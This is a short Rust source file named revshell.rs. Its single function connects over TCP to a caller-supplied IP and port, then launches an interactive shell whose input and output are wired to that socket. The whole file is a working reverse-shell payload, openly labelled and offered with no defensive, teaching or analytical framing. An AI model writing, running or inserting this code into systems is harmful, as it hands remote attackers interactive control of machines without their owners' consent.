/*
revshell.rs
*/

use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::os::unix::io::{AsRawFd, FromRawFd};


/* Open A Reverse Shell */
pub fn unixshell(ip: String, port: String, shell: String) -> std::io::Result<()> {
    let full: String = format!("{}:{}", ip, port);

    let sock = TcpStream::connect(full)?;
    let fd = sock.as_raw_fd();

    // Open shell
    Command::new(format!("{}", shell))
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()?.wait()?;

    println!("Shell exited");

    return Ok(());
}